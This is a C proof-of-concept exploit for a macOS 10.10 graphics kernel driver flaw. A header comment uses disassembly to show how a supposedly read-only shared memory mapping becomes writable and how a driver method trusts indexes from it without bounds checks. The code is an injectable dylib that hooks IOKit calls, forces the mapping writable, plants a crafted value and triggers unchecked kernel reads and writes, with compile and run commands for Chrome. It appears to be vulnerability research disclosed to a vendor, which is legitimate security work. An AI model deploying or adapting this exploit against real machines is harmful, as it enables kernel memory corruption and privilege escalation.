/*
tested on: MacBookAir5,2 w/ 10.10.1 (14B25)

The IOAccelContext2::clientMemoryForType accepts type value from 0 to 3. The code path for type=2 sets the kIOMapReadOnly flag of the IOOptionBits reference passed as the second argument by mapClientMemory64.

This flag is presumably supposed to enforce that the userspace mapping of this shared memory is read-only, and by default that is the case.

I was auditing more uses of shared memory and noticed that the kernel was trusting values in this read-only shared memory and wondered how this was enforced so took a look at the code responsible for handling the kIOMapReadOnly flag:

kIOMapReadOnly is used here in IOMemoryDescriptor.cpp:

        IOOptionBits createOptions = 0;
        if (!(kIOMapReadOnly & options))
        {
            createOptions |= kIOMemoryReferenceWrite;

As you can see, the flag is only used to prevent kIOMemoryReferenceWrite from being ORed onto the createOptions. 

later in IOMemoryDescriptor.cpp:

    // cache mode & vm_prot
    prot = VM_PROT_READ;
    cacheMode = ((_flags & kIOMemoryBufferCacheMask) >> kIOMemoryBufferCacheShift);
    prot |= vmProtForCacheMode(cacheMode);
    // VM system requires write access to change cache mode
    if (kIODefaultCache != cacheMode)                    prot |= VM_PROT_WRITE;
    if (kIODirectionOut != (kIODirectionOutIn & _flags)) prot |= VM_PROT_WRITE;
    if (kIOMemoryReferenceWrite & options)               prot |= VM_PROT_WRITE;

It turns out that kIOMemoryReferenceWrite is only one of the ways to get VM_PROT_WRITE set in the eventual protection flags used for the mapping - if we can specify a non-default cache mode then the mapping will also be writable, even if
kIOMapReadOnly was specified.

The 6th argument to IOConnectMapMemory is an IOOptionBits, looking at IOTypes.h we can see the flags which we can pass from userspace:

enum {
    kIODefaultCache   = 0,
    kIOInhibitCache   = 1,
    kIOWriteThruCache   = 2,
    kIOCopybackCache    = 3,
    kIOWriteCombineCache  = 4,
    kIOCopybackInnerCache = 5
};

// IOMemory mapping options
enum {
    kIOMapAnywhere    = 0x00000001,

    kIOMapCacheMask   = 0x00000700,
    kIOMapCacheShift    = 8,
    kIOMapDefaultCache    = kIODefaultCache       << kIOMapCacheShift,
    kIOMapInhibitCache    = kIOInhibitCache       << kIOMapCacheShift,
    kIOMapWriteThruCache  = kIOWriteThruCache     << kIOMapCacheShift,
    kIOMapCopybackCache   = kIOCopybackCache      << kIOMapCacheShift,
    kIOMapWriteCombineCache = kIOWriteCombineCache  << kIOMapCacheShift,
    kIOMapCopybackInnerCache  = kIOCopybackInnerCache << kIOMapCacheShift,

    kIOMapUserOptionsMask = 0x00000fff,
...

mapClientMemory64 enforces the kIOMapUserOptionsMask but this still lets us specify kIOWriteThruCache. By specifying this non-default cache mode in the call to IOConnectMapMemory the read-only mapping is now writeable :)

Selector 5 of IOAccelContext2 is finish_fence_event:

__text:00000000000046A0 ; __int64 __fastcall IOAccelContext2::finish_fence_event(IOAccelContext2 *__hidden this, unsigned int)
__text:00000000000046A0                 public __ZN15IOAccelContext218finish_fence_eventEj
__text:00000000000046A0 __ZN15IOAccelContext218finish_fence_eventEj proc near
__text:00000000000046A0                                         ; DATA XREF: __const:000000000003C478o
__text:00000000000046A0                 push    rbp
__text:00000000000046A1                 mov     rbp, rsp
__text:00000000000046A4                 push    rbx
__text:00000000000046A5                 push    rax
__text:00000000000046A6                 mov     rbx, rdi
__text:00000000000046A9                 mov     ecx, [rbx+628h]
__text:00000000000046AF                 test    ecx, ecx
__text:00000000000046B1                 mov     eax, 0E00002C2h
__text:00000000000046B6                 jz      short loc_46FE
__text:00000000000046B8                 shr     ecx, 6
__text:00000000000046BB                 cmp     ecx, esi
__text:00000000000046BD                 jb      short loc_46FE
__text:00000000000046BF                 mov     esi, esi
__text:00000000000046C1                 mov     rax, [rbx+518h]
__text:00000000000046C8                 mov     rdi, [rax+360h]
__text:00000000000046CF                 mov     rax, [rdi]
__text:00000000000046D2                 shl     rsi, 6
__text:00000000000046D6                 add     rsi, [rbx+5F8h]      ; +5F8h == pointer to kernel mapping of type 2 shared mem
__text:00000000000046DD                 call    qword ptr [rax+1B8h] ; IOAccelEventMachineFast2::finishEventUnlocked

this external method takes one scalar argument which is bounds checked then added to the pointer to the type 2 shared memory. This pointer into shared memory is passed to the virtual IOAccelEventMachineFast2::finishEventUnlocked function:

__text:000000000001E580 ; IOAccelEventMachineFast2::finishEventUnlocked(IOAccelEvent *)
__text:000000000001E580                 public __ZN24IOAccelEventMachineFast219finishEventUnlockedEP12IOAccelEvent
__text:000000000001E580 __ZN24IOAccelEventMachineFast219finishEventUnlockedEP12IOAccelEvent proc near
__text:000000000001E580                                         ; DATA XREF: __const:0000000000042B48o
__text:000000000001E580
__text:000000000001E580 var_50          = qword ptr -50h
__text:000000000001E580 var_48          = qword ptr -48h
__text:000000000001E580 var_40          = qword ptr -40h
__text:000000000001E580 var_38          = qword ptr -38h
__text:000000000001E580 var_30          = qword ptr -30h
__text:000000000001E580
__text:000000000001E580                 push    rbp
__text:000000000001E581                 mov     rbp, rsp
__text:000000000001E584                 push    r15
__text:000000000001E586                 push    r14
__text:000000000001E588                 push    r13
__text:000000000001E58A                 push    r12
__text:000000000001E58C                 push    rbx
__text:000000000001E58D                 sub     rsp, 28h
__text:000000000001E591                 mov     [rbp+var_50], rsi ; pointer to shared mem
__text:000000000001E595                 mov     rbx, rdi
__text:000000000001E598                 xor     r14d, r14d
__text:000000000001E59B                 xor     eax, eax
__text:000000000001E59D
__text:000000000001E59D loc_1E59D:                              ; CODE XREF: IOAccelEventMachineFast2::finishEventUnlocked(IOAccelEvent *)+EEj
__text:000000000001E59D                 mov     r12, [rsi+r14*8]  ; reading qword from shared mem
__text:000000000001E5A1                 cmp     r12d, 0FFFFFFFFh
__text:000000000001E5A5                 jz      loc_1E667
__text:000000000001E5AB                 mov     r13, r12        ; r12d = lower 32 bits of shared mem value
__text:000000000001E5AB                                         ; r13d = upper 32 bits of shared mem value
__text:000000000001E5AE                 shr     r13, 20h
__text:000000000001E5B2                 movsxd  rdi, r12d
__text:000000000001E5B5                 lea     rcx, [rdi+rdi*2]   ; rcx controlled
__text:000000000001E5B9                 mov     edx, r13d
__text:000000000001E5BC                 sub     edx, [rbx+rcx*4+0C8h] ; controlled read
__text:000000000001E5C3                 test    edx, edx
__text:000000000001E5C5                 jle     loc_1E667
__text:000000000001E5CB                 lea     r15, [rbx+rcx*4+0C8h] ; save address of previous controlled read
__text:000000000001E5D3                 mov     rcx, [rbx+28h]
__text:000000000001E5D7                 mov     rcx, [rcx+rdi*8]
__text:000000000001E5DB                 mov     edx, [rcx]
__text:000000000001E5DD                 mov     [r15], edx            ; write a different value there

As you can see, the shared memory is trusted to only contain valid indexes which are used for a series of memory reads and writes with no bounds checking.

This PoC hooks IOConnectMapMemory to set the kIOWriteThruCache flag and then trigger the bug.

compile: clang -Wall -dynamiclib -o finish_fence_event.dylib finish_fence_event.c -framework IOKit -arch i386 -arch x86_64 
run: DYLD_INSERT_LIBRARIES=./finish_fence_event.dylib /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --single-process

ianbeer
*/


#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

mach_port_t port = 0;
void* shared_buf = 0;
size_t shared_buf_size = 0;

kern_return_t
fake_IOConnectCallMethod(
  mach_port_t  connection,    // In
  uint32_t   selector,    // In
  /*const*/ uint64_t  *input,     // In
  uint32_t   inputCnt,    // In
  /*const*/ void  *inputStruct,   // In
  size_t     inputStructCnt,  // In
  uint64_t  *output,    // Out
  uint32_t  *outputCnt,   // In/Out
  void    *outputStruct,    // Out
  size_t    *outputStructCntP)  // In/Out
{
  kern_return_t ret = 0;  
  ret = IOConnectCallMethod(
    connection,
    selector,
    input,
    inputCnt,
    inputStruct,
    inputStructCnt,
    output,
    outputCnt,
    outputStruct,
    outputStructCntP);

  return ret;
}


kern_return_t
fake_IOConnectMapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t *atAddress,
  vm_size_t *ofSize,
  IOOptionBits options )
{
  printf("IOConnectMapMemory(connect=%x, memoryType=0x%x, intoTask=%x, atAddress=%p, ofSize=%x, options=%x)\n", connect, memoryType, intoTask, atAddress, ofSize, options);
  if (memoryType == 2 && connect == port){
    // add the kIOWriteThruCache flag to make the mapping writable despite the driver specifying kIOMapReadOnly :)
    options |= (2<<8);
  }
  kern_return_t ret = IOConnectMapMemory(connect, memoryType, intoTask, atAddress, ofSize, options);
  if (memoryType == 2 && connect == port){
    shared_buf = *atAddress;
    shared_buf_size = *ofSize;
    printf("  found shared memory buffer for IOAccelerator2 clientMemoryForType (type 2)\n");
  }
  printf("  after: *atAddress: %p *ofSize = %x\n", *atAddress,  *ofSize);
  return ret;
}

kern_return_t
fake_IOConnectUnmapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t atAddress)
{
  printf("IOConnectUnmapMemory(connect=%x, memoryType=0x%x, intoTask=%x, atAddress=%p)\n", connect, memoryType, intoTask, atAddress);
  if (memoryType == 2 && connect == port){
    shared_buf = 0;
  }
  return IOConnectUnmapMemory(connect, memoryType, intoTask, atAddress);
}

kern_return_t
fake_IOConnectCallStructMethod(
        mach_port_t      connection,            // In
        uint32_t         selector,              // In
        const void      *inputStruct,           // In
        size_t           inputStructCnt,        // In
        void            *outputStruct,          // Out
        size_t          *outputStructCnt)       // In/Out
{ 
  printf("callstructmethod\n");
  kern_return_t err; 
  static int count = 0;
  if (selector == 2 && connection == port && shared_buf && (++count) % 15 == 0){
    printf("######## %p : %zx\n", shared_buf, *(uint64_t*)shared_buf);

    // overwrite the first 8 bytes of the type 2 shared memory buffer
    *(uint64_t*)shared_buf = 0x4234567;
    
    uint64_t inputScalar[16] = {0};  
    uint64_t inputScalarCnt = 0;

    char inputStruct[4096] = {0};
    size_t inputStructCnt = 0;

    uint64_t outputScalar[16] = {0};
    uint32_t outputScalarCnt = 0;

    char outputStruct[4096] = {0};
    size_t outputStructCnt = 0;

    inputScalar[0] = 0;

    inputScalarCnt = 1;

    err = IOConnectCallMethod(
     connection,
     5,              //finish_fence_event
     inputScalar,
     inputScalarCnt,
     inputStruct,
     inputStructCnt,
     outputScalar,
     &outputScalarCnt,
     outputStruct,
     &outputStructCnt); 

    if (err != KERN_SUCCESS){
     printf("IOConnectCall error: %x\n", err);
    }
  }

  return IOConnectCallStructMethod(
          connection,            // In
          selector,              // In
          inputStruct,           // In
          inputStructCnt,        // In
          outputStruct,          // Out
          outputStructCnt);      // In/Out

}

CFMutableDictionaryRef
fake_IOServiceMatching(const char* name)
{
  CFMutableDictionaryRef ret = IOServiceMatching(name);
  printf("IOServiceMatching(name=%s) ret: %p\n", name, ret);
  return ret;
}

CFMutableDictionaryRef
fake_IOServiceNameMatching(
  const char *  name )
{
  CFMutableDictionaryRef ret = IOServiceNameMatching(name);
  printf("IOServiceNameMatching(name=%s) ret: %p\n", name, ret);
  return ret;
}

io_service_t
fake_IOServiceGetMatchingService(
  mach_port_t _masterPort,
  CFDictionaryRef matching )
{
  io_service_t ret = IOServiceGetMatchingService(_masterPort, matching);
  printf("IOServiceGetMatchingService(matching=%p) ret: %x\n", matching, ret);
  return ret;
}

kern_return_t
fake_IOServiceGetMatchingServices(
        mach_port_t _masterPort,
  CFDictionaryRef matching,
  io_iterator_t * existing )
{
  kern_return_t ret = IOServiceGetMatchingServices(_masterPort, matching, existing);
  printf("IOServiceGetMatchingServices(matching=%p, existing=%p) (*existing after call = %x\n", matching, existing, *existing);
  return ret;
}

kern_return_t
fake_IOServiceOpen(
  io_service_t service,
  task_port_t owningTask,
  uint32_t  type,
  io_connect_t  * connect )
{
  kern_return_t ret = IOServiceOpen(service, owningTask, type, connect);
  io_name_t className;
  IOObjectGetClass(service, className);
  printf("IOServiceOpen(service=%x, owningTask=%x, type=%x, connect=%p) (*connect after call = %x\n", service, owningTask, type, connect, *connect);
  printf("  (class: %s)\n", className);
  if (type == 0x1){
    //IGAccelGLContext
    port = *connect;
  }
  return ret;
}

io_object_t
fake_IOIteratorNext(
  io_iterator_t iterator )
{
  io_object_t ret = IOIteratorNext(iterator);
  printf("IOIteratorNext(iterator=%x) ret: %x\n", iterator, ret);
  return ret;
}

kern_return_t
fake_IOConnectGetService(
  io_connect_t  connect,
  io_service_t  * service )
{
  kern_return_t ret = IOConnectGetService(connect, service);
  printf("IOConnectGetService(connect=%x, service=%p) (*service after call = %x\n", connect, service, *service);
  return ret;
}

kern_return_t
fake_IOServiceClose(
  io_connect_t  connect )
{
  printf("IOServiceClose(connect=%p)\n", connect);
  return IOServiceClose(connect);
}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)fake_IOConnectCallMethod, .original = (void*)IOConnectCallMethod}, 
      {.replacement = (void*)fake_IOConnectMapMemory, .original = (void*)IOConnectMapMemory},
      {.replacement = (void*)fake_IOConnectUnmapMemory, .original = (void*)IOConnectUnmapMemory},
      {.replacement = (void*)fake_IOConnectCallStructMethod, .original = (void*)IOConnectCallStructMethod},
      {.replacement = (void*)fake_IOServiceMatching, .original = (void*)IOServiceMatching},
      {.replacement = (void*)fake_IOServiceGetMatchingService, .original = (void*)IOServiceGetMatchingService},
      {.replacement = (void*)fake_IOServiceGetMatchingServices, .original = (void*)IOServiceGetMatchingServices},
      {.replacement = (void*)fake_IOServiceOpen, .original = (void*)IOServiceOpen},
      {.replacement = (void*)fake_IOIteratorNext, .original = (void*)IOIteratorNext},
      {.replacement = (void*)fake_IOConnectGetService, .original = (void*)IOConnectGetService},
      {.replacement = (void*)fake_IOServiceNameMatching, .original = (void*)IOServiceNameMatching},
      {.replacement = (void*)fake_IOServiceClose, .original = (void*)IOServiceClose},
    };

